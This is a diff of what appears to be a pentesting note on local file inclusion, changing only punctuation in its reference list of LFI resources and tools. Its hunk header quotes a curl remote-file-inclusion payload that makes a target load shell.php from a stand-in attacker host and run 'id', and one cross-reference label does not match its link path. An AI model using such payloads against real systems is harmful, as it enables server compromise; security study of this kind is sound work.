@@ -487,11 +487,11 @@ curl 'http://target/?file=http://attacker.tld/shell.php&c=id'
 
 ## 11. References
 
-- OWASP LFI: https://owasp.org/www-community/attacks/Path_Traversal
-- PayloadsAllTheThings LFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
-- php_filter_chain_generator: https://github.com/synacktiv/php_filter_chain_generator
-- LFISuite: https://github.com/D35m0nd142/LFISuite
-- Kadimus: https://github.com/P0cL4bs/Kadimus
+- OWASP LFI - https://owasp.org/www-community/attacks/Path_Traversal
+- PayloadsAllTheThings LFI - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+- php_filter_chain_generator - https://github.com/synacktiv/php_filter_chain_generator
+- LFISuite - https://github.com/D35m0nd142/LFISuite
+- Kadimus - https://github.com/P0cL4bs/Kadimus
 
 > See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/XXE.md](../08%20Vulnerabilities/XXE.md), [File-Upload.md](./File-Upload.md)
 
